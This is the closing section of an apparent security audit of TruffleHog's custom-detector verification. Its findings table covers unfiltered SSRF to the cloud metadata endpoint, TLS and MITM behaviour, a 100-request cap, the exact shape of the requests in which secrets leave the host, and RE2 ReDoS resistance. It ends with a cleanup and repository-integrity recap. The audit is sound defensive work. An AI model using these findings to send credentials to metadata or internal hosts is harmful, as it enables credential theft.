| SSRF reachability — is any validation/allowlist/denylist applied? | §3.1 | **No filtering.** Only `ValidateVerifyEndpoint` (`validation.go:L35-L44`), whose sole check is `http://`+`!unsafe` (`L40-L42`). |
| **`169.254.169.254`** metadata endpoint reached? | §3.2 | **Yes** — POST to `/latest/meta-data/iam/security-credentials/` captured verbatim, carrying the secret. |
| `http://` without `unsafe` (edge case) | §3.3 | Config load fails at `main.go:L465`; error from `validation.go:L41`. Shown to be a plaintext opt-in, not an SSRF control (https-to-metadata contrast). |
| TLS / certificate validation over HTTPS | §4.1–4.2 | Go default strict verification (`SaneHttpClient`, no `TLSClientConfig`, `http.go:L211-L221`). Untrusted cert → handshake refused, **secret not transmitted** (empty server log). |
| Network MITM interception | §4.2–4.3 | Defeated for untrusted certs; `SSL_CERT_FILE` trust contrast proves trust is the sole blocker. |
| TLS-failure status (`unverified` vs `unknown`) | §4.4 | **`unverified`** observed (not `unknown`); cause = error swallow at `custom_detectors.go:L241-L242`. |
| Verification amplification — once or many? | §5.1–5.2 | One POST **per permutation**. |
| **`maxTotalMatches = 100`** cap | §5.1–5.2 | Confirmed; constant at **`custom_detectors.go:L23`**. 150 matches → exactly 100 POSTs; `verified+unverified==100` in every run. |
| Cap stability across repeated runs | §5.2 | Stable across ≥2 repeats per configuration. |
| Verification cache nuance | §5.3 | Cache dedups identical secrets across the scan (`verification_cache.go:L128-L129`,`L140`) but does not reduce in-`FromData` POST count; `maxTotalMatches` governs. |
| Data exfiltration — exact **headers** | §6.1–6.2 | `User-Agent: TruffleHog` (`http.go:L100`) + configured `Authorization` verbatim (`custom_detectors.go:L232-L238`) + `Accept-Encoding`, `Content-Length`. |
| Data exfiltration — exact **body shape** | §6.2 | `{"HogTokenDetector":{"token":[" …\n","…"]}}` — `json.Marshal` at `custom_detectors.go:L214-L216`; index 0 = full match, index 1 = capture group. |
| Non-200 response behavior | §6.3 | Secret **still transmitted**; marked unverified (gate at `L249`). |
| `successRanges` runtime effect | §6.4 | **No-op** — empirically: `successRanges:["403"]` + 403 server → still unverified. Never consulted (`L249` gates on 200 only); accessor unused. |
| **RE2** / ReDoS handling | §7.1–7.2 | Linear-time RE2 (`regexp.Compile` at `validation.go:L28`, `custom_detectors.go:L92`); `(a+)+$` on 500 k chars ≈ 9 ms vs exponential backtracking baseline. |
| Overall threat model | §8 | Trust boundary = whoever supplies `--config`; credential-exfiltration / internal-SSRF class; mitigations and (non-implemented) recommendations listed. |
| Web corroboration (RE2, Go TLS, IMDS) | §7.3 | Present, minimally quoted, authoritative sources cited. |

### 9.1 Observed corrections recap

1. `maxTotalMatches = 100` at **`custom_detectors.go:L23`**.
2. Config-parse `logFatal` at **`main.go:L465`**.
3. TLS failure → **`unverified`** (not `unknown`), due to the error swallow at `custom_detectors.go:L241-L242`.
4. `successRanges` is a **runtime no-op** (verification hardcoded to HTTP 200 at `custom_detectors.go:L249`).

### 9.2 Repository integrity

All observation artifacts (the built binary, the verification servers, probe configs, scan data, logs, and scripts) lived under `/tmp` and were removed on completion. The iptables NAT redirect used for the metadata-endpoint capture (§3.2) was removed after use. No source file anywhere in the repository was modified, and `go.mod`/`go.sum` are untouched. The only change introduced by this investigation is this document, `blitzy/documentation/trufflehog_e42153d44a5e.md`.

The whole `blitzy/` directory is newly created, so the default porcelain output collapses it to a single untracked entry; expanding untracked files shows the one and only file:

```
$ git status --porcelain
?? blitzy/

$ git status --porcelain --untracked-files=all
?? blitzy/documentation/trufflehog_e42153d44a5e.md

$ git diff --name-only HEAD
            # (empty — no tracked file modified)
```

---

*All command output in this document was captured at runtime through TruffleHog's canonical `--config` entry point using its own `CustomRegex` (`HogTokenDetector`) detector, against a local source build reporting version `dev`, at commit `e42153d44a5e5c37c1bd0c70e074781e9edcb760`. Timestamps, worker IDs, and sub-millisecond durations vary naturally run-to-run.*

